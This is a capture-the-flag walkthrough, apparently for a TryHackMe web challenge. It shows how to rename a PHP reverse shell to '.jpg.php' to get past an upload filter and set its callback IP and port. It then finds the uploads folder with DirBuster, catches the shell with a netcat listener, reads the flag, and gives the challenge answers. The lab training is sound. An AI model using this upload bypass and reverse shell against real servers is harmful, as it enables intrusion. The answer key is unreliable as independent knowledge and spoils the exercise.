@@ -1,0 +1,178 @@
+DAY TWO CHALLENGES
+Walkthrough
+
+1. What string of text needs adding to the URL to get access to the upload page?
+
+In order to add our iD as a parameter to the URL of the “Protection” page, we need to append it to the end of the page's address.
+
+Example: 
+
+http://10.10.144.105/?id=ODIzODI5MTNiYmYw
+
+
+ANSWER - /?id=ODIzODI5MTNiYmYw
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+2. What type of file is accepted by the site?
+
+There are a few ways to figure this out, and one of them is just by using the context of the instructions on the “Protection" page's upload form. 
+
+"If you see any suspicious people near the factory, take a picture and upload it here!"
+
+The form asks that you use it to upload pictures of suspicious people near the factory. Photos are typically referred to as “image” files, so we can guess from the context alone that the accepted file types are IMAGES. 
+
+To double check our work, we can refer to the page's source code. 
+
+• Right-click anywhere in the body of the “Protection" page and select “View Page Source” from the pop-up menu. 
+• Examine the page source and look for the <input type> tag. 
+
+<input type=file id="chooseFile" accept=".jpeg,.jpg,.png"> 
+
+The file extensions that we're able to upload on this page are listed as “.jpeg,.jpg,.png”. 
+
+These flle extensions all belong to image files, so the answer is indeed IMAGES. 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Bypass the filter and upload a reverse shell.
+
+We learned in the previous question that we can only submit 3 specific types of image files using this upload form. Our reverse shell .php script is not included in the list of the formats that we can upload, so we'll need to rename it to get it through!
+
+Before we rename it, we need to edit the parameters for the reverse shell so it knows which IP address and port to connect to once it's activated. To do this, we need to open the php-reverse-shell.php file in a text editor. 
+
+• Open a new terminal window. 
+• Use the “Change Directory” (cd) command to switch to the location where you saved the .php file. 
+   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+cd /home/kali/Downloads/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+• Open the file in the text editor of your choice. For this exercise, I used nano. 
+   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nano php-reverse-shell.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+• Edit the following entries to correspond with the IP address of your machine and the port ‘4444’.
+   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+$ip = '10.6.17.23';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+• Press CTRL + O to write the changes to the file. 
+• When prompted, change the file name to ‘php-reverse-shell.jpg.php’ and press ENTER. 
+• When prompted, press ‘Y’ to save the file with a new file name in the same location. 
+• Press CTRL + X to exit nano. 
+
+Now our reverse shell script is ready, and will be allowed to pass through the file type filter on the upload form! 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+3. In which directory are the uploaded files stored?
+
+There are two ways to answer this question. Again, we can use the information we were given in the challenge dossier to make a reasonably accurate guess. We're given a few common directory names that we could put into the browser's address bar after our ID and see if we get access to a directory. 
+
+The dossier information included the following common directory names for us to try: 
+
+• /uploads
+• /images
+• /media
+• /resources
+
+Starting from the top of the list, we'll add “/uploads” to the end of our URL, after the ID:
+
+http://10.10.144.105/?id=ODIzODI5MTNiYmYw/uploads
+
+We have directory access! “/uploads” appears to be the correct answer. 
+
+We could have also used DirBuster to find valid directories within the structure of this site. DirBuster uses a wordlist to search for hidden directories and files on a web server. You can create your own wordlists, or if you're using Kali, you can use the included wordlists in the following directory:
+
+usr/share/wordlists
+
+Some of the included wordlists are lengthy; the scans would take longer to complete using these lists, and they may have produced results that we didn't need to complete the challenge.  Because we were given a short list of 4 common directories, I would have made these into a wordlist and letting DirBuster scan for only those 4 entries. 
+
+To make a wordlist, we'll create a .txt file with our text editor of choice. We'll use ‘nano’ again. 
+
+• In a terminal window, type ‘nano’ and press ENTER. 
+• Inside the empty nano window, enter the directory names we're going to use to make our wordlist. 
+• Each name should be on a seperate line. Press ENTER after each directory name to move to the line below. 
+• Do not include a ‘/’ before the directory name. 
+
+Once all the directory names have been entered, press CTRL + O to write the changes to a file. 
+When prompted, create a name for the file. For this example, we'll call our new wordlist “short-wordlist-1.txt”. 
+Type the filename in the space at the bottom of the screen and press ENTER to save it. 
+
+In the terminal window, type ‘dirbuster’ to launch the DirBuster GUI.
+Conversely, you can run DirBuster from the command prompt using syntax similar to this:
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+java -jar DirBuster-1.0-RC1 -u http://10.10.144.105/ -l /home/kali/Documents/small-wordlist-1.txt
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+You'll need to replace “http://10.10.144.105” with the IP address of the active machine, and “/home/kali/Documents/small-wordlist-1.txt” with the file path where you saved your new wordlist. 
+
+Once you've replaced those parameters with the correct ones for your environment, press ENTER to run the command. 
+
+When the DirBuster scan is finished running, you'll be shown the results either in the GUI window or in the terminal window. You're likely going to see that the scan found the ‘uploads’ directory exists, though it may have a ‘403' next to it. This is likely because our ID wasn't included in the URL it used for the scan, and if we navigate to that address in our browser, we'll be able to access it as long as we remember to include our ID in the URL, like this:
+
+http://10.10.144.105/?id=ODIzODI5MTNiYmYw/uploads
+
+
+ANSWER - UPLOADS
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Activate your reverse shell and catch it in a netcat listener!
+
+In a terminal window, enter the following to start listening on port 4444 with netcat: 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -lvnp 4444
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+On the “Protection” web page, click on the link for “php-reverse-shell.jpg.php” to activate the script. 
+
+In your terminal window, you should see activity in the listener! 
+
+At the reverse shell prompt, enter the following to navigate to the folder where the flag is stored: 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+cd /var/www/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Then, use the CAT command to open the flag.txt file: 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+cat flag.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+4. What is the flag in /var/www/flag.txt?
+
+
+ANSWER - THM{MGU3Y2UyMGUwNgExYTY4NTAxOWJhMzhh
+
+
